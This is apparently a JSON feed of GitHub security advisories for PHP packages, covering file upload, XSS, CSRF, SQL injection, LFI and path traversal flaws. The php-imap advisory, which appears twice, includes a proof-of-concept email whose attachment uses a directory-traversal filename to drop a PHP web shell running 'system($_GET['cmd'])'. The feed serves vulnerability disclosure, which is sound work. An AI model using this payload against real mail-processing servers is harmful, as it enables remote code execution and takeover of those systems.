{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<p>funadmin v3.3.2 and v3.3.3 are vulnerable to insecure file upload via the plugins install.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36097\">https://nvd.nist.gov/vuln/detail/CVE-2023-36097</a></li>\n<li><a href=\"https://github.com/funadmin/funadmin/issues/17\">https://github.com/funadmin/funadmin/issues/17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5m3m-q8cq-77g4\">https://github.com/advisories/GHSA-5m3m-q8cq-77g4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5m3m-q8cq-77g4",
            "title": "[funadmin/funadmin] fuadmin vulnerable to insecure file upload",
            "date_modified": "2023-06-22T20:01:32.000Z",
            "date_published": "2023-06-22T15:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5m3m-q8cq-77g4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>laravel-s prior to 3.7.36 is vulnerable to Local File Inclusion via <code>/src/Illuminate/Laravel.php</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-29931\">https://nvd.nist.gov/vuln/detail/CVE-2023-29931</a></li>\n<li><a href=\"https://github.com/hhxsv5/laravel-s/issues/437\">https://github.com/hhxsv5/laravel-s/issues/437</a></li>\n<li><a href=\"https://github.com/hhxsv5/laravel-s/commit/05aa615527725f0b696da78ae4c7d3a5065bac6d\">https://github.com/hhxsv5/laravel-s/commit/05aa615527725f0b696da78ae4c7d3a5065bac6d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q2fp-jw87-86px\">https://github.com/advisories/GHSA-q2fp-jw87-86px</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q2fp-jw87-86px",
            "title": "[hhxsv5/laravel-s] laravel-s vulnerable to Local File Inclusion",
            "date_modified": "2023-06-22T20:00:46.000Z",
            "date_published": "2023-06-22T12:30:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q2fp-jw87-86px"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting vulnerability in khodakhah NodCMS v.3.0 allows an attacker with administrative privileges to execute arbitrary code and gain access to sensitive information via a crafted script to the address parameter.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-20697\">https://nvd.nist.gov/vuln/detail/CVE-2020-20697</a></li>\n<li><a href=\"https://github.com/khodakhah/nodcms/issues/41\">https://github.com/khodakhah/nodcms/issues/41</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7xqx-xwg9-jx34\">https://github.com/advisories/GHSA-7xqx-xwg9-jx34</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7xqx-xwg9-jx34",
            "title": "[khodakhah/nodcms] NodCMS Cross Site Scripting vulnerability",
            "date_modified": "2023-06-27T22:31:33.000Z",
            "date_published": "2023-06-20T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7xqx-xwg9-jx34"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>File Upload vulnerability in liufee CMS v.2.0.7.1 allows a remote attacker to execute arbitrary code via the image suffix function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-21174\">https://nvd.nist.gov/vuln/detail/CVE-2020-21174</a></li>\n<li><a href=\"https://github.com/liufee/cms/issues/44\">https://github.com/liufee/cms/issues/44</a></li>\n<li><a href=\"https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9\">https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q3q5-qvh5-cmw5\">https://github.com/advisories/GHSA-q3q5-qvh5-cmw5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q3q5-qvh5-cmw5",
            "title": "[feehi/cms] liufee CMS File Upload vulnerability",
            "date_modified": "2023-06-27T21:59:08.000Z",
            "date_published": "2023-06-20T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q3q5-qvh5-cmw5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting vulnerability in YiiCMS v.1.2.0 and prior allows a remote attacker to execute arbitrary code via the news function. A fix is available at commit 4a9d68564eb78d9f64e3f5dd77186a154093615b.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-21246\">https://nvd.nist.gov/vuln/detail/CVE-2020-21246</a></li>\n<li><a href=\"https://github.com/yongshengli/yiicms/issues/6\">https://github.com/yongshengli/yiicms/issues/6</a></li>\n<li><a href=\"https://github.com/yongshengli/yiicms/commit/4a9d68564eb78d9f64e3f5dd77186a154093615b\">https://github.com/yongshengli/yiicms/commit/4a9d68564eb78d9f64e3f5dd77186a154093615b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gqr4-cvf4-3957\">https://github.com/advisories/GHSA-gqr4-cvf4-3957</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gqr4-cvf4-3957",
            "title": "[sheng/yiicms] YiiCMS Cross Site Scripting vulnerability",
            "date_modified": "2023-06-27T21:59:26.000Z",
            "date_published": "2023-06-20T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gqr4-cvf4-3957"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>File Upload vulnerability in Liufee CMS, AKA Feehicms v.2.0.8 allows a remote attacker to execute arbitrary code via the <code>/admin/index.php?r=admin-user%2Fupdate-self</code> component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-21489\">https://nvd.nist.gov/vuln/detail/CVE-2020-21489</a></li>\n<li><a href=\"https://github.com/liufee/cms/issues/46\">https://github.com/liufee/cms/issues/46</a></li>\n<li><a href=\"https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9\">https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6vf2-mfmr-qqqw\">https://github.com/advisories/GHSA-6vf2-mfmr-qqqw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6vf2-mfmr-qqqw",
            "title": "[feehi/cms] Liufee CMS File Upload vulnerability",
            "date_modified": "2023-06-27T21:59:46.000Z",
            "date_published": "2023-06-20T15:31:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6vf2-mfmr-qqqw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>An attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a <code>$filename</code>, or providing an unsanitized <code>$filename</code>, in <code>src/Attachment::save(string $path, string $filename = null)</code> (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a>).\nIn this case, where no <code>$filename</code> gets passed into the <code>Attachment::save()</code> method, the package would use a series of unsanitized and insecure input values from the mail as fallback (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a>).\nEven if a developer passes a <code>$filename</code> into the <code>Attachment::save()</code> method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.\nThere is also no restriction about the file extension (e.g. \".php\") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.\nThe attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...\nThe official documentation only shows examples of <code>Attachment::save()</code> without providing the <code>$filename</code> (<a href=\"https://www.php-imap.com/api/attachment\">https://www.php-imap.com/api/attachment</a>), which makes this vulnerability even more widespread.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>send an email with a malicious attachment to an inbox, which gets crawled by the package</li>\n</ol>\n<pre><code>Return-Path: &lt;attacker@example.com&gt;\nDate: Fri, 17 Aug 2018 14:36:24 +0000\nFrom: Attacker &lt;attacker@example.com&gt;\nTo: Victim &lt;victim@example.com&gt;\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\"\n\nMail with malicious attachment\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\nContent-Type: application/octet-stream; name=shell.php\nContent-Transfer-Encoding: 8bit\nContent-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php\n\n&lt;?php\n// RCE\nsystem($_GET['cmd'] ?? '#');\n?&gt;\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--\n\n</code></pre>\n<ol start=\"3\">\n<li>crawl email with malicious attachment</li>\n<li>store the attachment with <code>Attachment::save('/path/to/storage')</code> without providing a <code>$filename</code> value</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.\nEvery application that stores attachments with <code>Attachment::save()</code> without providing a <code>$filename</code> or passing unsanitized user input is affected by this attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/pull/414\">https://github.com/Webklex/php-imap/pull/414</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/releases/tag/5.3.0\">https://github.com/Webklex/php-imap/releases/tag/5.3.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9",
            "title": "[webklex/laravel-imap] php-imap vulnerable to RCE through a directory traversal vulnerability",
            "date_modified": "2023-06-21T21:59:00.000Z",
            "date_published": "2023-06-21T21:58:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>An attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a <code>$filename</code>, or providing an unsanitized <code>$filename</code>, in <code>src/Attachment::save(string $path, string $filename = null)</code> (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a>).\nIn this case, where no <code>$filename</code> gets passed into the <code>Attachment::save()</code> method, the package would use a series of unsanitized and insecure input values from the mail as fallback (<a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a>).\nEven if a developer passes a <code>$filename</code> into the <code>Attachment::save()</code> method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.\nThere is also no restriction about the file extension (e.g. \".php\") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.\nThe attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...\nThe official documentation only shows examples of <code>Attachment::save()</code> without providing the <code>$filename</code> (<a href=\"https://www.php-imap.com/api/attachment\">https://www.php-imap.com/api/attachment</a>), which makes this vulnerability even more widespread.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>send an email with a malicious attachment to an inbox, which gets crawled by the package</li>\n</ol>\n<pre><code>Return-Path: &lt;attacker@example.com&gt;\nDate: Fri, 17 Aug 2018 14:36:24 +0000\nFrom: Attacker &lt;attacker@example.com&gt;\nTo: Victim &lt;victim@example.com&gt;\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\"\n\nMail with malicious attachment\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\nContent-Type: application/octet-stream; name=shell.php\nContent-Transfer-Encoding: 8bit\nContent-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php\n\n&lt;?php\n// RCE\nsystem($_GET['cmd'] ?? '#');\n?&gt;\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--\n\n</code></pre>\n<ol start=\"3\">\n<li>crawl email with malicious attachment</li>\n<li>store the attachment with <code>Attachment::save('/path/to/storage')</code> without providing a <code>$filename</code> value</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.\nEvery application that stores attachments with <code>Attachment::save()</code> without providing a <code>$filename</code> or passing unsanitized user input is affected by this attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/pull/414\">https://github.com/Webklex/php-imap/pull/414</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252\">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a></li>\n<li><a href=\"https://github.com/Webklex/php-imap/releases/tag/5.3.0\">https://github.com/Webklex/php-imap/releases/tag/5.3.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-47p7-xfcc-4pv9\">https://github.com/advisories/GHSA-47p7-xfcc-4pv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9",
            "title": "[webklex/php-imap] php-imap vulnerable to RCE through a directory traversal vulnerability",
            "date_modified": "2023-06-21T21:59:00.000Z",
            "date_published": "2023-06-21T21:58:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-47p7-xfcc-4pv9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Request Forgery vulnerability in Gila GilaCMS v.1.11.4 allows a remote attacker to execute arbitrary code via the <code>cm/update_rows/user</code> parameter.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-20726\">https://nvd.nist.gov/vuln/detail/CVE-2020-20726</a></li>\n<li><a href=\"https://github.com/GilaCMS/gila/issues/51\">https://github.com/GilaCMS/gila/issues/51</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4cw3-rhqx-vqwr\">https://github.com/advisories/GHSA-4cw3-rhqx-vqwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4cw3-rhqx-vqwr",
            "title": "[gilacms/gila] GilaCMS Cross Site Request Forgery vulnerability",
            "date_modified": "2023-06-27T21:58:46.000Z",
            "date_published": "2023-06-20T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4cw3-rhqx-vqwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Craft CMS through 4.4.9 is vulnerable to HTML Injection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-33495\">https://nvd.nist.gov/vuln/detail/CVE-2023-33495</a></li>\n<li><a href=\"https://medium.com/@mondalsomnath9135/html-injection-in-craft-cms-application-e2b28f746212\">https://medium.com/@mondalsomnath9135/html-injection-in-craft-cms-application-e2b28f746212</a></li>\n<li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection\">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m3v5-gjj9-rg24\">https://github.com/advisories/GHSA-m3v5-gjj9-rg24</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m3v5-gjj9-rg24",
            "title": "[craftcms/cms] Craft CMS vulnerable to HTML injection",
            "date_modified": "2023-06-27T21:58:21.000Z",
            "date_published": "2023-06-20T15:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m3v5-gjj9-rg24"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28851\">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772\">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>\n<li><a href=\"https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622\">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38h6-gmr2-j4wx\">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx",
            "title": "[bigfork/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting",
            "date_modified": "2023-06-21T18:01:34.000Z",
            "date_published": "2023-04-03T21:06:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38h6-gmr2-j4wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"duplicate-advisory\">Duplicate Advisory</h3>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-wm5g-p99q-66g4. This link is maintained to preserve external references.</p>\n<h3 id=\"original-description\">Original Description</h3>\n<p>_joinPath in elFinderVolumeLocalFileSystem.class.php in elFinder before 2.1.62 allows path traversal in the PHP LocalVolumeDriver connector.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4\">https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35840\">https://nvd.nist.gov/vuln/detail/CVE-2023-35840</a></li>\n<li><a href=\"https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891\">https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3p2q-mh7q-9pxj\">https://github.com/advisories/GHSA-3p2q-mh7q-9pxj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3p2q-mh7q-9pxj",
            "title": "[studio-42/elfinder] Duplicate Advisory: elFinder vulnerable to path traversal in LocalVolumeDriver connector",
            "date_modified": "2023-06-19T20:16:23.000Z",
            "date_published": "2023-06-19T03:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3p2q-mh7q-9pxj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The ipandlanguageredirect extension before 5.1.2 for TYPO3 allows SQL Injection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-35782\">https://nvd.nist.gov/vuln/detail/CVE-2023-35782</a></li>\n<li><a href=\"https://typo3.org/security/advisory/typo3-ext-sa-2023-005\">https://typo3.org/security/advisory/typo3-ext-sa-2023-005</a></li>\n<li><a href=\"https://github.com/einpraegsam/ipandlanguageredirect/commit/d80eb99e739a09984ad0ea94b12380236346ae42\">https://github.com/einpraegsam/ipandlanguageredirect/commit/d80eb99e739a09984ad0ea94b12380236346ae42</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/in2code/ipandlanguageredirect/CVE-2023-35782.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/in2code/ipandlanguageredirect/CVE-2023-35782.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4xf2-7qfv-mgfx\">https://github.com/advisories/GHSA-4xf2-7qfv-mgfx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4xf2-7qfv-mgfx",
            "title": "[in2code/ipandlanguageredirect] ipandlanguageredirect extension vulnerable to SQL Injection",
            "date_modified": "2023-06-27T19:50:55.000Z",
            "date_published": "2023-06-16T15:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4xf2-7qfv-mgfx"
            },
            "tags": [
                "severity"
            ]
        },
        {
